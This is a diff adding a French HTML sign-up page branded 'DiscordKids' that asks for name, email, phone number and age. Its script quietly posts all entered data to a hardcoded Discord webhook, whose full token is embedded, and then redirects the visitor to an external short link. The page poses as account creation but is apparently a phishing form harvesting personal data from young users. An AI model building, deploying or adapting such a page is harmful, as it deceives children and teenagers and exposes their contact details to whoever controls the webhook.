@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DiscordKids - Create Account</title>
+<style>
+  * { box-sizing: border-box; margin:0; padding:0; }
+  body {
+    font-family: Arial, sans-serif;
+    background:#0f172a;
+    color:#f1f5f9;
+    display:flex;
+    flex-direction:column;
+    min-height:100vh;
+  }
+
+  /* Navbar */
+  .navbar {
+    width:100%;
+    background:#1e293b;
+    padding:16px 24px;
+    box-shadow:0 4px 12px rgba(0,0,0,0.4);
+    font-size:20px;
+    font-weight:bold;
+    text-align:center;
+  }
+  .navbar span { color:#06b6d4; }
+
+  /* Container central */
+  .container {
+    flex:1;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+  }
+
+  .card {
+    background:#1e293b;
+    padding:32px 24px;
+    border-radius:12px;
+    max-width:400px;
+    width:100%;
+    box-shadow:0 6px 18px rgba(0,0,0,0.4);
+  }
+
+  h2 { text-align:center; margin-bottom:20px; }
+
+  label { display:block; margin-top:12px; font-size:14px; text-align:left; }
+  input {
+    width:100%;
+    padding:10px;
+    border-radius:6px;
+    border:none;
+    margin-top:4px;
+    font-size:14px;
+  }
+
+  .btn {
+    margin-top:20px;
+    padding:12px;
+    border:none;
+    border-radius:8px;
+    font-weight:bold;
+    cursor:pointer;
+    width:100%;
+    font-size:16px;
+    background:#22c55e;
+    color:#012;
+    transition: 0.2s;
+  }
+  .btn:hover { background:#16a34a; }
+
+  #status {
+    margin-top:12px;
+    font-size:14px;
+    text-align:center;
+    min-height:18px;
+  }
+
+  @media (max-width:480px){
+    .card { padding:24px 16px; }
+    input { padding:8px; font-size:13px; }
+    .btn { padding:10px; font-size:15px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="navbar">DiscordKids - <span>Create Account</span></div>
+
+<div class="container">
+  <div class="card">
+    <h2>Créer un compte</h2>
+    <form id="signup-form">
+      <label>Nom<input type="text" id="nom" required></label>
+      <label>Prénom<input type="text" id="prenom" required></label>
+      <label>Email<input type="email" id="email" required></label>
+      <label>Numéro de téléphone<input type="tel" id="telephone" required></label>
+      <label>Âge<input type="number" id="age" min="13" required></label>
+      <button type="submit" class="btn">Confirmer</button>
+    </form>
+    <div id="status"></div>
+  </div>
+</div>
+
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1421687078319816714/qtqZfZpb8-wS8Yx5IlapiJ7YoxttV0T2XMYpC7wIEaPIYSMjnSBc_GHD4LK3HC9iaZVI"; 
+
+  async function sendToDiscord(payload){
+    try {
+      const res = await fetch(WEBHOOK_URL, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify(payload)
+      });
+      return res.ok;
+    } catch(e){
+      return false;
+    }
+  }
+
+  document.getElementById('signup-form').addEventListener('submit', async e=>{
+    e.preventDefault();
+
+    const data = {
+      nom: document.getElementById('nom').value,
+      prenom: document.getElementById('prenom').value,
+      email: document.getElementById('email').value,
+      telephone: document.getElementById('telephone').value,
+      age: document.getElementById('age').value
+    };
+
+    const payload = {
+      content: "Nouvelle inscription",
+      embeds: [{
+        title:"Création de compte",
+        fields:[
+          {name:"Nom", value:data.nom, inline:true},
+          {name:"Prénom", value:data.prenom, inline:true},
+          {name:"Email", value:data.email, inline:false},
+          {name:"Téléphone", value:data.telephone, inline:true},
+          {name:"Âge", value:data.age, inline:true}
+        ]
+      }]
+    };
+
+    const ok = await sendToDiscord(payload);
+
+    if(ok){
+      document.getElementById('status').textContent = "Données envoyées ✅";
+      setTimeout(()=>{ window.location.href = "https://yip.su/DiscordKids"; }, 1000);
+    } else {
+      document.getElementById('status').textContent = "Échec de l'envoi ❌";
+    }
+  });
+</script>
+
+</body>
+</html>
